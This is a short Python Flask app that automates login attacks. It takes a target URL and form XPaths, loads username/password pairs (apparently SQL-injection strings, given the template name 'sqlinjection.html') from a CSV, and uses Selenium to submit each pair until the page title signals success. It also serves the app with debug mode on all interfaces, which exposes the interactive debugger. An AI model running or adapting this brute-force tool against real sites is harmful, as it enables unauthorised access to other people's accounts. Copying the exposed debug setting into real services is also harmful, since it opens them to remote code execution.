from selenium import webdriver
import pandas as pd
from selenium.webdriver.common.by import By
from flask import Flask, render_template, request
app = Flask(__name__)


@app.route('/',methods = ['GET'])
def show_index_html():
    return render_template('sqlinjection.html')

@app.route('/send_data', methods = ['POST'])
def get_data_from_html():
        url = request.form['url']
        unamex=request.form['xpathuname']
        pwdx=request.form['xpathpwd']
        subx=request.form['xpathsubmit']
        title=request.form['titlestring']
        brutevals=pd.read_csv('bruter.csv')
        username=list(brutevals['username'])
        password=list(brutevals['password'])
        for i in range(len(username)):
         driver=webdriver.Chrome()
         driver.get(url)
         ufield=driver.find_element(By.XPATH,unamex)
         pfield=driver.find_element(By.XPATH,pwdx)
         ufield.send_keys(username[i])
         pfield.send_keys(password[i])
         subbut=driver.find_element(By.XPATH,subx)
         subbut.click()
         if(driver.title==title):
            return "1"
        else:
            return "0"
   

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)
